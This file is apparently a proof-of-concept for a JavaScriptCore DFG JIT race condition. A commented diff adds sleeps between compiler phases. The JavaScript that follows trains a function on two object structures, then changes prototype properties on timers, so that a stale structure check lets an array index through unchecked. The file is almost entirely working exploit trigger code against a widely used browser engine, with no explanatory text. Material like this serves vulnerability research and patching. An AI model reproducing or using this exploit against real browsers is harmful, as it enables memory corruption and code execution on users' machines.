/*

Apply patch.diff:

diff --git a/Source/JavaScriptCore/dfg/DFGPlan.cpp b/Source/JavaScriptCore/dfg/DFGPlan.cpp
index 7ef80267ead2..4c0bac8b32ed 100644
--- a/Source/JavaScriptCore/dfg/DFGPlan.cpp
+++ b/Source/JavaScriptCore/dfg/DFGPlan.cpp
@@ -399,8 +399,19 @@ Plan::CompilationPath Plan::compileInThreadImpl()
             // State-at-tail and state-at-head will be invalid if we did strength reduction since
             // it might increase live ranges.
             RUN_PHASE(performGraphPackingAndLivenessAnalysis);
+
+            dataLogLn("FIRST SLEEP\n");
+            usleep(1000 * 1000);
+
             RUN_PHASE(performCFA);
+
+            dataLogLn("SECOND SLEEP\n");
+            usleep(1000 * 1000);
+
             RUN_PHASE(performConstantFolding);
+
+            dataLogLn("SLEEP DONE\n");
+
             RUN_PHASE(performCFGSimplification);
         }
         

*/
let foceAnotherBB1 = true
let foceAnotherBB2 = true
let foceAnotherBB3 = true
let foceAnotherBB4 = true
let foceAnotherBB5 = true
function opt(container, objectOfS2, accessArray, transition) {
    container.someRandomPropertyToEmitCheckStructure;
    (typeof container).replace('a', 'b');

    let object = Object.getPrototypeOf(container);
    if (objectOfS2) {
        object = objectOfS2;

        0[0];
    }

    // CheckStructure(@object, S1 | S2)
    object.x;

    // @array = NewArray(...)
    const array = ['a'];

    let result;
    for (let i = 0; i < 2; i++) {
        if (!objectOfS2 && accessArray) {
            // CheckStructure(@object, S1)
            // @index = GetByOffset(@object, 'index')
            const index = object[object.x];

            if (accessArray) {
                if (foceAnotherBB1) {
                if (foceAnotherBB2) {
                if (foceAnotherBB3) {
                if (foceAnotherBB4) {
                if (foceAnotherBB5) {
                // GetByVal(@array, @index)
                result = array[index][0];
                }}}}}
            }
        }

        transition.z = 1;
    }

    return result;
}

function createObjectOfS1() {
    const object = {x: 'toJSON', toJSON: 0};

    Object.create(object);

    return object;
}


function createObjectOfS2() {
    const object = createObjectOfS1();
    object.y = 1;

    return object;
}

function main() {
    const objectOfS1 = createObjectOfS1();
    const objectOfS2 = createObjectOfS2();
    const container = Object.create(objectOfS1);

    for (let i = 0; i < 1000; i++) {
        opt(container, null, false, {});
        opt(container, objectOfS2, false, {});
    }

    for (let i = 0; i < 30000; i++) {
        if (i == 500) {
            foceAnotherBB3 = true
        } else {
            foceAnotherBB3 = true
        }
        opt(container, null, i < 1, {});
    }

    setTimeout(() => {
        JSON.stringify(container);

        setTimeout(() => {
            objectOfS1.y = 1;

            setTimeout(() => {
                objectOfS1.toJSON = 1;

                opt(container, null, false, {});
                opt(container, null, false, {});
            }, 2000);
        }, 1000);
    }, 500);
}

main();
